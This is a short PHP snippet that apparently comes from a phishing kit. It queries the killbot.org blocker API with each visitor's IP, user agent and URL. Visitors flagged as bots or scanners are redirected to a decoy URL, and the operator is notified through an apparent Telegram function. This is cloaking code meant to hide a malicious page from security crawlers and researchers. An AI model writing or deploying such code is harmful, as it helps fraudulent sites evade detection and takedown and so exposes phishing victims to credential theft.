<?php
$agentKill = urlencode($_SERVER["HTTP_USER_AGENT"]);
$getDataKill = curll("https://killbot.org/api/v2/blocker?ip=" . $remoteip . "&apikey=" . $kill_bot_api . "&ua=" . $agentKill . "&url=" . $_SERVER['REQUEST_URI']);
$getData = json_decode($getDataKill);
if ($getData->{'data'}->{'block_access'}) {
    $info_kill = $respo->geoplugin_request . ' from ' . $respo->geoplugin_countryName . ' was blocked by killbot.org ';
    if ($full_notification) {
        teleg($info_kill);
    }
    header('Location: ' . faker());
    exit();
}